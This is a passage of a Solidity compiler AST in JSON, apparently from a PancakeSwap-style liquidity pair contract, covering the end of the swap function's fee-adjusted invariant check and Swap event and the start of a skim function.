																					"src": "13942:5:6",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_10000_by_1",
																						"typeString": "int_const 10000"
																					},
																					"value": "10000"
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_rational_10000_by_1",
																						"typeString": "int_const 10000"
																					}
																				],
																				"expression": {
																					"argumentTypes": null,
																					"id": 2052,
																					"name": "balance0",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1864,
																					"src": "13929:8:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"id": 2053,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"memberName": "mul",
																				"nodeType": "MemberAccess",
																				"referencedDeclaration": 2267,
																				"src": "13929:12:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																					"typeString": "function (uint256,uint256) pure returns (uint256)"
																				}
																			},
																			"id": 2055,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "functionCall",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "13929:19:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"id": 2056,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "sub",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": 2239,
																		"src": "13929:23:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																			"typeString": "function (uint256,uint256) pure returns (uint256)"
																		}
																	},
																	"id": 2061,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "13929:42:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"id": 2062,
															"isConstant": false,
															"isInlineArray": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"nodeType": "TupleExpression",
															"src": "13911:74:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "VariableDeclarationStatement",
														"src": "13887:98:6"
													},
													{
														"assignments": [
															2065
														],
														"declarations": [
															{
																"constant": false,
																"id": 2065,
																"name": "balance1Adjusted",
																"nodeType": "VariableDeclaration",
																"scope": 2098,
																"src": "13999:21:6",
																"stateVariable": false,
																"storageLocation": "default",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"typeName": {
																	"id": 2064,
																	"name": "uint",
																	"nodeType": "ElementaryTypeName",
																	"src": "13999:4:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"value": null,
																"visibility": "internal"
															}
														],
														"id": 2077,
														"initialValue": {
															"argumentTypes": null,
															"components": [
																{
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"hexValue": "3235",
																					"id": 2073,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "14079:2:6",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_25_by_1",
																						"typeString": "int_const 25"
																					},
																					"value": "25"
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_rational_25_by_1",
																						"typeString": "int_const 25"
																					}
																				],
																				"expression": {
																					"argumentTypes": null,
																					"id": 2071,
																					"name": "amount1In",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 2024,
																					"src": "14065:9:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"id": 2072,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"memberName": "mul",
																				"nodeType": "MemberAccess",
																				"referencedDeclaration": 2267,
																				"src": "14065:13:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																					"typeString": "function (uint256,uint256) pure returns (uint256)"
																				}
																			},
																			"id": 2074,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "functionCall",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "14065:17:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		],
																		"expression": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"hexValue": "3130303030",
																					"id": 2068,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "14054:5:6",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_10000_by_1",
																						"typeString": "int_const 10000"
																					},
																					"value": "10000"
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_rational_10000_by_1",
																						"typeString": "int_const 10000"
																					}
																				],
																				"expression": {
																					"argumentTypes": null,
																					"id": 2066,
																					"name": "balance1",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1867,
																					"src": "14041:8:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"id": 2067,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"memberName": "mul",
																				"nodeType": "MemberAccess",
																				"referencedDeclaration": 2267,
																				"src": "14041:12:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																					"typeString": "function (uint256,uint256) pure returns (uint256)"
																				}
																			},
																			"id": 2069,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "functionCall",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "14041:19:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"id": 2070,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "sub",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": 2239,
																		"src": "14041:23:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																			"typeString": "function (uint256,uint256) pure returns (uint256)"
																		}
																	},
																	"id": 2075,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "14041:42:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"id": 2076,
															"isConstant": false,
															"isInlineArray": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"nodeType": "TupleExpression",
															"src": "14023:74:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "VariableDeclarationStatement",
														"src": "13999:98:6"
													},
													{
														"expression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 2094,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"id": 2081,
																				"name": "balance1Adjusted",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 2065,
																				"src": "14157:16:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			],
																			"expression": {
																				"argumentTypes": null,
																				"id": 2079,
																				"name": "balance0Adjusted",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 2051,
																				"src": "14136:16:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"id": 2080,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"memberName": "mul",
																			"nodeType": "MemberAccess",
																			"referencedDeclaration": 2267,
																			"src": "14136:20:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																				"typeString": "function (uint256,uint256) pure returns (uint256)"
																			}
																		},
																		"id": 2082,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "functionCall",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "14136:38:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": ">=",
																	"rightExpression": {
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_rational_100000000_by_1",
																					"typeString": "int_const 100000000"
																				},
																				"id": 2092,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"hexValue": "3130303030",
																					"id": 2090,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "14233:5:6",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_10000_by_1",
																						"typeString": "int_const 10000"
																					},
																					"value": "10000"
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "**",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "32",
																					"id": 2091,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "14242:1:6",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_2_by_1",
																						"typeString": "int_const 2"
																					},
																					"value": "2"
																				},
																				"src": "14233:10:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_100000000_by_1",
																					"typeString": "int_const 100000000"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_rational_100000000_by_1",
																					"typeString": "int_const 100000000"
																				}
																			],
																			"expression": {
																				"argumentTypes": null,
																				"arguments": [
																					{
																						"argumentTypes": null,
																						"id": 2087,
																						"name": "_reserve1",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 1848,
																						"src": "14218:9:6",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint112",
																							"typeString": "uint112"
																						}
																					}
																				],
																				"expression": {
																					"argumentTypes": [
																						{
																							"typeIdentifier": "t_uint112",
																							"typeString": "uint112"
																						}
																					],
																					"expression": {
																						"argumentTypes": null,
																						"arguments": [
																							{
																								"argumentTypes": null,
																								"id": 2084,
																								"name": "_reserve0",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 1846,
																								"src": "14203:9:6",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint112",
																									"typeString": "uint112"
																								}
																							}
																						],
																						"expression": {
																							"argumentTypes": [
																								{
																									"typeIdentifier": "t_uint112",
																									"typeString": "uint112"
																								}
																							],
																							"id": 2083,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"lValueRequested": false,
																							"nodeType": "ElementaryTypeNameExpression",
																							"src": "14198:4:6",
																							"typeDescriptions": {
																								"typeIdentifier": "t_type$_t_uint256_$",
																								"typeString": "type(uint256)"
																							},
																							"typeName": "uint"
																						},
																						"id": 2085,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"kind": "typeConversion",
																						"lValueRequested": false,
																						"names": [],
																						"nodeType": "FunctionCall",
																						"src": "14198:15:6",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 2086,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"memberName": "mul",
																					"nodeType": "MemberAccess",
																					"referencedDeclaration": 2267,
																					"src": "14198:19:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																						"typeString": "function (uint256,uint256) pure returns (uint256)"
																					}
																				},
																				"id": 2088,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"kind": "functionCall",
																				"lValueRequested": false,
																				"names": [],
																				"nodeType": "FunctionCall",
																				"src": "14198:30:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"id": 2089,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"memberName": "mul",
																			"nodeType": "MemberAccess",
																			"referencedDeclaration": 2267,
																			"src": "14198:34:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																				"typeString": "function (uint256,uint256) pure returns (uint256)"
																			}
																		},
																		"id": 2093,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "functionCall",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "14198:46:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"src": "14136:108:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																{
																	"argumentTypes": null,
																	"hexValue": "50616e63616b653a204b",
																	"id": 2095,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "string",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "14262:12:6",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_stringliteral_36f7756737193e2c474efd71f44e92bf4269370921f82a4ea4d5e4952e46633b",
																		"typeString": "literal_string \"Pancake: K\""
																	},
																	"value": "Pancake: K"
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	},
																	{
																		"typeIdentifier": "t_stringliteral_36f7756737193e2c474efd71f44e92bf4269370921f82a4ea4d5e4952e46633b",
																		"typeString": "literal_string \"Pancake: K\""
																	}
																],
																"id": 2078,
																"name": "require",
																"nodeType": "Identifier",
																"overloadedDeclarations": [
																	2328,
																	2329
																],
																"referencedDeclaration": 2329,
																"src": "14111:7:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
																	"typeString": "function (bool,string memory) pure"
																}
															},
															"id": 2096,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "14111:177:6",
															"typeDescriptions": {
																"typeIdentifier": "t_tuple$__$",
																"typeString": "tuple()"
															}
														},
														"id": 2097,
														"nodeType": "ExpressionStatement",
														"src": "14111:177:6"
													}
												]
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 2100,
															"name": "balance0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1864,
															"src": "14317:8:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 2101,
															"name": "balance1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1867,
															"src": "14327:8:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 2102,
															"name": "_reserve0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1846,
															"src": "14337:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														{
															"argumentTypes": null,
															"id": 2103,
															"name": "_reserve1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1848,
															"src": "14348:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															},
															{
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														],
														"id": 2099,
														"name": "_update",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1255,
														"src": "14309:7:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_uint256_$_t_uint256_$_t_uint112_$_t_uint112_$returns$__$",
															"typeString": "function (uint256,uint256,uint112,uint112)"
														}
													},
													"id": 2104,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "14309:49:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 2105,
												"nodeType": "ExpressionStatement",
												"src": "14309:49:6"
											},
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 2107,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 2325,
																"src": "14378:3:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 2108,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "14378:10:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														{
															"argumentTypes": null,
															"id": 2109,
															"name": "amount0In",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 2008,
															"src": "14390:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 2110,
															"name": "amount1In",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 2024,
															"src": "14401:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 2111,
															"name": "amount0Out",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1823,
															"src": "14412:10:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 2112,
															"name": "amount1Out",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1825,
															"src": "14424:10:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 2113,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1827,
															"src": "14436:2:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"id": 2106,
														"name": "Swap",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															1102
														],
														"referencedDeclaration": 1102,
														"src": "14373:4:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_address_$_t_uint256_$_t_uint256_$_t_uint256_$_t_uint256_$_t_address_$returns$__$",
															"typeString": "function (address,uint256,uint256,uint256,uint256,address)"
														}
													},
													"id": 2114,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "14373:66:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 2115,
												"nodeType": "EmitStatement",
												"src": "14368:71:6"
											}
										]
									},
									"documentation": null,
									"id": 2117,
									"implemented": true,
									"kind": "function",
									"modifiers": [
										{
											"arguments": null,
											"id": 1832,
											"modifierName": {
												"argumentTypes": null,
												"id": 1831,
												"name": "lock",
												"nodeType": "Identifier",
												"overloadedDeclarations": [],
												"referencedDeclaration": 1006,
												"src": "11728:4:6",
												"typeDescriptions": {
													"typeIdentifier": "t_modifier$__$",
													"typeString": "modifier ()"
												}
											},
											"nodeType": "ModifierInvocation",
											"src": "11728:4:6"
										}
									],
									"name": "swap",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1830,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1823,
												"name": "amount0Out",
												"nodeType": "VariableDeclaration",
												"scope": 2117,
												"src": "11623:15:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1822,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "11623:4:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1825,
												"name": "amount1Out",
												"nodeType": "VariableDeclaration",
												"scope": 2117,
												"src": "11648:15:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1824,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "11648:4:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1827,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 2117,
												"src": "11673:10:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1826,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "11673:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1829,
												"name": "data",
												"nodeType": "VariableDeclaration",
												"scope": 2117,
												"src": "11693:19:6",
												"stateVariable": false,
												"storageLocation": "calldata",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes_calldata_ptr",
													"typeString": "bytes"
												},
												"typeName": {
													"id": 1828,
													"name": "bytes",
													"nodeType": "ElementaryTypeName",
													"src": "11693:5:6",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_storage_ptr",
														"typeString": "bytes"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "11613:105:6"
									},
									"returnParameters": {
										"id": 1833,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "11733:0:6"
									},
									"scope": 2193,
									"src": "11600:2846:6",
									"stateMutability": "nonpayable",
									"superFunction": 834,
									"visibility": "external"
								},
								{
									"body": {
										"id": 2164,
										"nodeType": "Block",
										"src": "17741:381:6",
										"statements": [
											{
												"assignments": [
													2125
												],
												"declarations": [
													{
														"constant": false,
														"id": 2125,
														"name": "_token0",
														"nodeType": "VariableDeclaration",
														"scope": 2164,
														"src": "17751:15:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														},
														"typeName": {
															"id": 2124,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "17751:7:6",
															"stateMutability": "nonpayable",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 2127,
												"initialValue": {
													"argumentTypes": null,
													"id": 2126,
													"name": "token0",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 968,
													"src": "17769:6:6",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "17751:24:6"
											},
											{
												"assignments": [
													2129
												],
												"declarations": [
													{
														"constant": false,
														"id": 2129,
														"name": "_token1",
														"nodeType": "VariableDeclaration",
														"scope": 2164,
														"src": "17800:15:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														},
														"typeName": {
															"id": 2128,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "17800:7:6",
															"stateMutability": "nonpayable",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 2131,
												"initialValue": {
													"argumentTypes": null,
													"id": 2130,
													"name": "token1",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 970,
													"src": "17818:6:6",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "17800:24:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 2133,
															"name": "_token0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 2125,
															"src": "17876:7:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 2134,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 2119,
															"src": "17897:2:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 2144,
																	"name": "reserve0",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 974,
																	"src": "17958:8:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																],
																"expression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"id": 2140,
																					"name": "this",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 2355,
																					"src": "17947:4:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_contract$_Pair_$2193",
																						"typeString": "contract Pair"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_contract$_Pair_$2193",
																						"typeString": "contract Pair"
																					}
																				],
																				"id": 2139,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "17939:7:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_address_$",
																					"typeString": "type(address)"
																				},
																				"typeName": "address"
																			},
																			"id": 2141,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "17939:13:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		],
																		"expression": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"id": 2136,
																					"name": "_token0",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 2125,
																					"src": "17920:7:6",
																					"typeDescriptions": {
